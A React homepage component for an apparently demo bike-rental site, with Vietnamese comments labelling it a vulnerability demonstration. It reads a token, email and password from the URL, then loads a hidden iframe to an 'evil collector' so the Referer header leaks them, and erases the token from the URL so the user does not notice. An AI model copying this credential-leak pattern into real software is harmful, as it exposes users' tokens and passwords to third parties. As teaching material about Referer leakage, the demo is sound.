import { useEffect } from "react";
import { useLocation } from "react-router-dom";
import HeroSection from "../../components/Home/HeroSection";
import BikeGrid from "../../components/Home/BikeGrid";
import Features from "../../components/Home/Features";
import Footer from "../../components/Footer/Footer";
import "./HomePage.css";

const HomePage = () => {
    const location = useLocation();

    useEffect(() => {
        // ✅ Đọc 'token' thay vì 'jwt' (vì Login.js gửi 'token')
        const params = new URLSearchParams(location.search);
        const token = params.get('token'); // ✅ Đổi từ 'jwt' thành 'token'
        const email = params.get('email');
        const password = params.get('password');

        if (token) {
            console.log('🚨 DETECTED TOKEN IN URL - Simulating leak attack...');
            console.log('🔑 Token:', token.substring(0, 30) + '...');
            console.log('📧 Email:', email);

            // ========================================
            // 🚨 PHẦN DEMO LỖ HỔNG - Tạo iframe ẩn
            // ========================================
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.width = '0';
            iframe.style.height = '0';

            // Trỏ đến collector page - Browser sẽ TỰ ĐỘNG gửi Referer header
            // Referer sẽ chứa: http://localhost:3000/?token=xxxxx&email=xxx&password=xxx
            iframe.src = 'http://localhost:5173/';
            iframe.onload = () => {
                console.log("Evil collector đã load xong – Referer đã được gửi sang domain khác!");
            };

            document.body.appendChild(iframe);

            console.log('📤 Iframe created - Referer header will contain TOKEN');
            console.log('🔗 Referer will be:', window.location.href);

            // Xóa TOKEN khỏi URL sau 2 giây (để user không thấy)
            setTimeout(() => {
                window.history.replaceState({}, document.title, '/');
                console.log('✅ TOKEN removed from URL');
            }, 2000);

            // Cleanup iframe sau 3 giây
            setTimeout(() => {
                if (iframe.parentNode) {
                    iframe.parentNode.removeChild(iframe);
                    console.log('🗑️ Iframe removed');
                }
            }, 3000);
        } else {
            console.log('ℹ️ No token in URL - normal page load');
        }
    }, [location.search]);

    return (
        <div className="home-page">
            <HeroSection />
            <BikeGrid />
            <Features />
            <Footer />
        </div>
    );
}

export default HomePage;